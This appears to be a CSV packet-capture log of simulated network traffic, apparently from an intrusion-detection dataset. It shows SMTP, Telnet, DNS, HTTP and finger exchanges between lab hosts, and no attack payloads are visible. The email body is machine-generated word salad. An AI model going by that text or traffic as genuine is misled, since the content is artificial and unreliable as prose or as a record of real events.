"R"," R", "409232","12:12:27.738075","195.73.151.50","172.16.114.207","SMTP","102","S: 250 (pigeon.eyrie.af.mil) pleased to meet you."
"R"," R", "409233","12:12:27.748483","172.16.114.207","195.73.151.50","TCP","60","8729 → 25 [ACK] Seq=53 Ack=160 Win=32120 Len=0"
"R"," R", "409234","12:12:27.768750","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409235","12:12:27.768972","172.16.114.207","195.73.151.50","SMTP","94","C: MAIL From:<elysea@pigeon.eyrie.af.mil>"
"R"," R", "409236","12:12:27.770350","195.73.151.50","172.16.114.207","SMTP","101","S: 250 <elysea@pigeon.eyrie.af.mil>... Sender Ok"
"R"," R", "409237","12:12:27.770691","172.16.114.207","195.73.151.50","SMTP","89","C: RCPT To:<petaj@lambda.orange.com>"
"R"," R", "409238","12:12:27.771508","195.73.151.50","172.16.114.207","SMTP","88","S: 250 <petaj@lambda.orange.com> OK"
"R"," R", "409239","12:12:27.771793","172.16.114.207","195.73.151.50","SMTP","60","C: DATA"
"R"," R", "409240","12:12:27.773835","195.73.151.50","172.16.114.207","SMTP","104","S: 354 Enter mail, end with ." on a line by itself""
"R"," R", "409241","12:12:27.774884","172.16.114.207","195.73.151.50","IMF","1008","subject: Knowledge, Template see no problem for The, , Knowledge, Template see no problem for The Ai Lab and coding bug Working  , for you.   ,   , Wrote.  Not from by tuition is Ok ok.  One The cores had an weight  , file to a user to both of September December subroutines to read  , database Management is in Motif Development tool to disk desktop disk  , should follow her but only information about it was told me to connect,  , or it does the Ti, database.  Han, w; Iran The list few would like to  , sign your signature No action from and, in random numbers.  Neural  , network can backup tray, with your message of magnitude squared error  , on The tape that to The next time principles in Null open I a friend of  , shared storage.   "
"R"," R", "409242","12:12:27.777185","195.73.151.50","172.16.114.207","SMTP","73","S: 250 Mail accepted"
"R"," R", "409243","12:12:27.777417","172.16.114.207","195.73.151.50","SMTP","60","C: QUIT"
"R"," R", "409244","12:12:27.778211","195.73.151.50","172.16.114.207","SMTP","78","S: 221 Closing connection"
"R"," R", "409245","12:12:27.778594","195.73.151.50","172.16.114.207","TCP","60","25 → 8729 [FIN, ACK] Seq=334 Ack=1094 Win=32736 Len=0"
"R"," R", "409246","12:12:27.778753","172.16.114.207","195.73.151.50","TCP","60","8729 → 25 [ACK] Seq=1094 Ack=335 Win=32120 Len=0"
"R"," R", "409247","12:12:27.780546","172.16.114.207","195.73.151.50","TCP","60","8729 → 25 [FIN, ACK] Seq=1094 Ack=335 Win=32120 Len=0"
"R"," R", "409248","12:12:27.781236","195.73.151.50","172.16.114.207","TCP","60","25 → 8729 [ACK] Seq=335 Ack=1095 Win=32735 Len=0"
"R"," R", "409249","12:12:27.786843","172.16.114.50","172.16.112.149","TCP","60","23 → 8728 [ACK] Seq=142 Ack=87 Win=31744 Len=0"
"R"," R", "409250","12:12:27.818716","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409251","12:12:27.836833","172.16.114.50","172.16.112.149","TCP","60","23 → 8728 [ACK] Seq=142 Ack=88 Win=31744 Len=0"
"R"," R", "409252","12:12:27.868695","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409253","12:12:27.886818","172.16.114.50","172.16.112.149","TCP","60","23 → 8728 [ACK] Seq=142 Ack=89 Win=31744 Len=0"
"R"," R", "409254","12:12:27.918700","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409255","12:12:27.936808","172.16.114.50","172.16.112.149","TCP","60","23 → 8728 [ACK] Seq=142 Ack=90 Win=31744 Len=0"
"R"," R", "409256","12:12:27.942056","172.16.112.100","172.16.112.20","DNS","79","Standard query 0x0013 A www.mideastclub.com"
"R"," R", "409257","12:12:27.943080","172.16.112.20","192.168.1.20","DNS","79","Standard query 0x2cdd A www.mideastclub.com"
"R"," R", "409258","12:12:27.947658","192.168.1.20","172.16.112.20","DNS","139","Standard query response 0x2cdd A www.mideastclub.com A 209.130.23.169 NS aesop.world.net A 192.168.1.20"
"R"," R", "409259","12:12:27.948332","172.16.112.20","172.16.112.100","DNS","139","Standard query response 0x0013 A www.mideastclub.com A 209.130.23.169 NS aesop.world.net A 192.168.1.20"
"R"," R", "409260","12:12:27.968762","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409261","12:12:27.986803","172.16.114.50","172.16.112.149","TCP","60","23 → 8728 [ACK] Seq=142 Ack=91 Win=31744 Len=0"
"R"," R", "409262","12:12:28.019736","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409263","12:12:28.020092","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409264","12:12:28.038428","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=93 Ack=144 Win=32120 Len=0"
"R"," R", "409265","12:12:28.038747","172.16.114.50","172.16.112.149","TELNET","109","Telnet Data ..."
"R"," R", "409266","12:12:28.058425","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=93 Ack=199 Win=32120 Len=0"
"R"," R", "409267","12:12:28.058723","172.16.114.50","172.16.112.149","TELNET","70","Telnet Data ..."
"R"," R", "409268","12:12:28.078415","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=93 Ack=215 Win=32120 Len=0"
"R"," R", "409269","12:12:28.128439","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409270","12:12:28.148417","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=93 Ack=221 Win=32120 Len=0"
"R"," R", "409271","12:12:29.018190","","","LOOP","60","Reply"
"R"," R", "409272","12:12:29.846281","172.16.112.100","209.130.23.169","TCP","60","1988 → 80 [SYN] Seq=0 Win=8192 Len=0 MSS=1460"
"R"," R", "409273","12:12:29.852381","209.130.23.169","172.16.112.100","TCP","60","80 → 1988 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "409274","12:12:29.852500","172.16.112.100","209.130.23.169","TCP","60","1988 → 80 [ACK] Seq=1 Ack=1 Win=8760 Len=0"
"R"," R", "409275","12:12:30.033316","172.16.112.100","209.130.23.169","HTTP","322","GET / HTTP/1.0 "
"R"," R", "409276","12:12:30.049996","209.130.23.169","172.16.112.100","TCP","60","80 → 1988 [ACK] Seq=1 Ack=269 Win=32736 Len=0"
"R"," R", "409277","12:12:30.079163","209.130.23.169","172.16.112.100","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "409278","12:12:30.080392","209.130.23.169","172.16.112.100","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "409279","12:12:30.080589","172.16.112.100","209.130.23.169","TCP","60","1988 → 80 [ACK] Seq=269 Ack=2921 Win=8760 Len=0"
"R"," R", "409280","12:12:30.084256","209.130.23.169","172.16.112.100","HTTP","82","HTTP/1.1 200 OK  (text/html)"
"R"," R", "409281","12:12:30.084447","209.130.23.169","172.16.112.100","TCP","60","80 → 1988 [FIN, ACK] Seq=2949 Ack=269 Win=32736 Len=0"
"R"," R", "409282","12:12:30.084585","172.16.112.100","209.130.23.169","TCP","60","1988 → 80 [ACK] Seq=269 Ack=2950 Win=8732 Len=0"
"R"," R", "409283","12:12:30.139229","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409284","12:12:30.139625","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409285","12:12:30.157971","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=94 Ack=222 Win=32120 Len=0"
"R"," R", "409286","12:12:30.158118","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409287","12:12:30.158448","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409288","12:12:30.177962","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=95 Ack=223 Win=32120 Len=0"
"R"," R", "409289","12:12:30.178106","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409290","12:12:30.178440","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409291","12:12:30.197959","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=96 Ack=224 Win=32120 Len=0"
"R"," R", "409292","12:12:30.198100","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409293","12:12:30.198431","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409294","12:12:30.217954","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=97 Ack=225 Win=32120 Len=0"
"R"," R", "409295","12:12:30.218096","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409296","12:12:30.218429","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409297","12:12:30.237950","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=98 Ack=226 Win=32120 Len=0"
"R"," R", "409298","12:12:30.238092","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409299","12:12:30.238423","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409300","12:12:30.257946","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=99 Ack=227 Win=32120 Len=0"
"R"," R", "409301","12:12:30.258088","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409302","12:12:30.258420","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409303","12:12:30.277941","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=100 Ack=228 Win=32120 Len=0"
"R"," R", "409304","12:12:30.278083","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409305","12:12:30.278415","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409306","12:12:30.297938","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=101 Ack=229 Win=32120 Len=0"
"R"," R", "409307","12:12:30.298079","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409308","12:12:30.298410","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409309","12:12:30.317936","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=102 Ack=230 Win=32120 Len=0"
"R"," R", "409310","12:12:30.318075","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409311","12:12:30.318407","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409312","12:12:30.337934","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=103 Ack=231 Win=32120 Len=0"
"R"," R", "409313","12:12:30.338072","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409314","12:12:30.338403","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409315","12:12:30.357928","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=104 Ack=232 Win=32120 Len=0"
"R"," R", "409316","12:12:30.358081","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409317","12:12:30.358412","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409318","12:12:30.377921","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=105 Ack=233 Win=32120 Len=0"
"R"," R", "409319","12:12:30.378063","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409320","12:12:30.378395","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409321","12:12:30.397916","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=106 Ack=234 Win=32120 Len=0"
"R"," R", "409322","12:12:30.398058","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409323","12:12:30.398390","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409324","12:12:30.417914","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=107 Ack=235 Win=32120 Len=0"
"R"," R", "409325","12:12:30.418058","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409326","12:12:30.418389","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409327","12:12:30.437908","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=108 Ack=236 Win=32120 Len=0"
"R"," R", "409328","12:12:30.438051","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409329","12:12:30.438382","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409330","12:12:30.457905","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=109 Ack=237 Win=32120 Len=0"
"R"," R", "409331","12:12:30.458045","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409332","12:12:30.458435","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409333","12:12:30.477913","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=110 Ack=238 Win=32120 Len=0"
"R"," R", "409334","12:12:30.478042","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409335","12:12:30.478374","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409336","12:12:30.497896","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=111 Ack=239 Win=32120 Len=0"
"R"," R", "409337","12:12:30.498037","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409338","12:12:30.498369","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409339","12:12:30.517891","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=112 Ack=240 Win=32120 Len=0"
"R"," R", "409340","12:12:30.518034","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409341","12:12:30.518366","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409342","12:12:30.537886","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=113 Ack=241 Win=32120 Len=0"
"R"," R", "409343","12:12:30.538032","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409344","12:12:30.538365","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409345","12:12:30.557882","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=114 Ack=242 Win=32120 Len=0"
"R"," R", "409346","12:12:30.558024","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409347","12:12:30.558357","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409348","12:12:30.577879","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=115 Ack=243 Win=32120 Len=0"
"R"," R", "409349","12:12:30.578021","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409350","12:12:30.578353","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409351","12:12:30.597877","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=116 Ack=244 Win=32120 Len=0"
"R"," R", "409352","12:12:30.608306","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409353","12:12:30.608637","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409354","12:12:30.618262","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409355","12:12:30.618602","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409356","12:12:30.637914","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=118 Ack=246 Win=32120 Len=0"
"R"," R", "409357","12:12:30.638264","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409358","12:12:30.638595","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409359","12:12:30.657916","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=119 Ack=247 Win=32120 Len=0"
"R"," R", "409360","12:12:30.738074","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409361","12:12:30.738415","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409362","12:12:30.739660","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409363","12:12:30.740000","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409364","12:12:30.757878","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=121 Ack=249 Win=32120 Len=0"
"R"," R", "409365","12:12:30.758171","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409366","12:12:30.758502","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409367","12:12:30.777868","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=122 Ack=250 Win=32120 Len=0"
"R"," R", "409368","12:12:30.778136","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409369","12:12:30.778465","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409370","12:12:30.797869","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=123 Ack=251 Win=32120 Len=0"
"R"," R", "409371","12:12:30.798749","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409372","12:12:30.799079","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409373","12:12:30.817861","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=124 Ack=252 Win=32120 Len=0"
"R"," R", "409374","12:12:30.818114","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409375","12:12:30.818444","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409376","12:12:30.837855","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=125 Ack=253 Win=32120 Len=0"
"R"," R", "409377","12:12:30.839417","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409378","12:12:30.839767","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409379","12:12:30.846462","172.16.114.50","172.16.112.20","DNS","77","Standard query 0x9115 A zeno.eyrie.af.mil"
"R"," R", "409380","12:12:30.847487","172.16.112.20","172.16.114.50","DNS","142","Standard query response 0x9115 A zeno.eyrie.af.mil A 172.16.113.50 NS hobbes.eyrie.af.mil A 172.16.112.20"
"R"," R", "409381","12:12:30.848767","172.16.114.50","172.16.113.50","TCP","60","2711 → 79 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "409382","12:12:30.850092","172.16.113.50","172.16.114.50","TCP","60","79 → 2711 [SYN, ACK] Seq=0 Ack=1 Win=4096 Len=0 MSS=1460"
"R"," R", "409383","12:12:30.850331","172.16.114.50","172.16.113.50","TCP","60","2711 → 79 [ACK] Seq=1 Ack=1 Win=31744 Len=0"
"R"," R", "409384","12:12:30.850447","172.16.114.50","172.16.113.50","TCP","61","[TCP segment of a reassembled PDU]"
"R"," R", "409385","12:12:30.857855","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=127 Ack=257 Win=32120 Len=0"
"R"," R", "409386","12:12:30.858091","172.16.114.50","172.16.112.149","TELNET","75","Telnet Data ..."
"R"," R", "409387","12:12:30.877890","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=127 Ack=278 Win=32120 Len=0"
"R"," R", "409388","12:12:30.931046","172.16.113.50","172.16.114.50","TCP","60","79 → 2711 [ACK] Seq=1 Ack=8 Win=4089 Len=0"
"R"," R", "409389","12:12:30.931250","172.16.114.50","172.16.113.50","FINGER","60","Query"
"R"," R", "409390","12:12:30.960744","172.16.113.50","172.16.114.50","TCP","60","79 → 2711 [FIN, ACK] Seq=1 Ack=10 Win=4096 Len=0"
"R"," R", "409391","12:12:30.960958","172.16.114.50","172.16.113.50","TCP","60","2711 → 79 [ACK] Seq=10 Ack=2 Win=31744 Len=0"
"R"," R", "409392","12:12:30.961114","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409393","12:12:30.961230","172.16.114.50","172.16.113.50","TCP","60","2711 → 79 [FIN, ACK] Seq=10 Ack=2 Win=31744 Len=0"
"R"," R", "409394","12:12:30.962156","172.16.113.50","172.16.114.50","TCP","60","79 → 2711 [ACK] Seq=2 Ack=11 Win=4096 Len=0"
"R"," R", "409395","12:12:30.977855","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=127 Ack=280 Win=32120 Len=0"
"R"," R", "409396","12:12:30.978058","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409397","12:12:30.997853","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=127 Ack=286 Win=32120 Len=0"
"R"," R", "409398","12:12:31.090085","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409399","12:12:31.090421","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409400","12:12:31.107820","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=128 Ack=287 Win=32120 Len=0"
"R"," R", "409401","12:12:31.108335","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409402","12:12:31.108666","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409403","12:12:31.127822","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=129 Ack=288 Win=32120 Len=0"
"R"," R", "409404","12:12:31.128202","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409405","12:12:31.128532","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409406","12:12:31.147794","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=130 Ack=289 Win=32120 Len=0"
"R"," R", "409407","12:12:31.148083","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409408","12:12:31.148415","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409409","12:12:31.167765","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=131 Ack=290 Win=32120 Len=0"
"R"," R", "409410","12:12:31.167918","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409411","12:12:31.168248","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409412","12:12:31.187761","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=132 Ack=291 Win=32120 Len=0"
"R"," R", "409413","12:12:31.189991","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409414","12:12:31.190322","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409415","12:12:31.207759","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=135 Ack=292 Win=32120 Len=0"
"R"," R", "409416","12:12:31.207973","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409417","12:12:31.208043","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409418","12:12:31.226143","172.16.114.50","172.16.112.149","TCP","60","23 → 8728 [ACK] Seq=294 Ack=138 Win=31744 Len=0"
"R"," R", "409419","12:12:31.227784","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=138 Ack=294 Win=32120 Len=0"
"R"," R", "409420","12:12:31.227997","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409421","12:12:31.228149","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409422","12:12:31.246133","172.16.114.50","172.16.112.149","TCP","60","23 → 8728 [ACK] Seq=297 Ack=140 Win=31744 Len=0"
"R"," R", "409423","12:12:31.247768","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=140 Ack=297 Win=32120 Len=0"
"R"," R", "409424","12:12:31.247984","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409425","12:12:31.248229","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409426","12:12:31.248561","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409427","12:12:31.267748","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=143 Ack=300 Win=32120 Len=0"
"R"," R", "409428","12:12:31.268055","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409429","12:12:31.268117","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409430","12:12:31.286137","172.16.114.50","172.16.112.149","TCP","60","23 → 8728 [ACK] Seq=302 Ack=145 Win=31744 Len=0"
"R"," R", "409431","12:12:31.287734","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=145 Ack=302 Win=32120 Len=0"
"R"," R", "409432","12:12:31.287922","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409433","12:12:31.287991","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409434","12:12:31.306118","172.16.114.50","172.16.112.149","TCP","60","23 → 8728 [ACK] Seq=304 Ack=147 Win=31744 Len=0"
"R"," R", "409435","12:12:31.307783","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=147 Ack=304 Win=32120 Len=0"
"R"," R", "409436","12:12:31.307998","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409437","12:12:31.327751","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=147 Ack=306 Win=32120 Len=0"
"R"," R", "409438","12:12:31.337102","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409439","12:12:31.337431","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409440","12:12:31.347767","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=148 Ack=307 Win=32120 Len=0"
"R"," R", "409441","12:12:31.348287","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409442","12:12:31.348619","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409443","12:12:31.367770","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=149 Ack=308 Win=32120 Len=0"
"R"," R", "409444","12:12:31.368294","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409445","12:12:31.368624","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409446","12:12:31.387764","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=150 Ack=309 Win=32120 Len=0"
"R"," R", "409447","12:12:31.388149","172.16.112.149","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "409448","12:12:31.388481","172.16.114.50","172.16.112.149","TELNET","60","Telnet Data ..."
"R"," R", "409449","12:12:31.407751","172.16.112.149","172.16.114.50","TCP","60","8728 → 23 [ACK] Seq=151 Ack=310 Win=32120 Len=0"
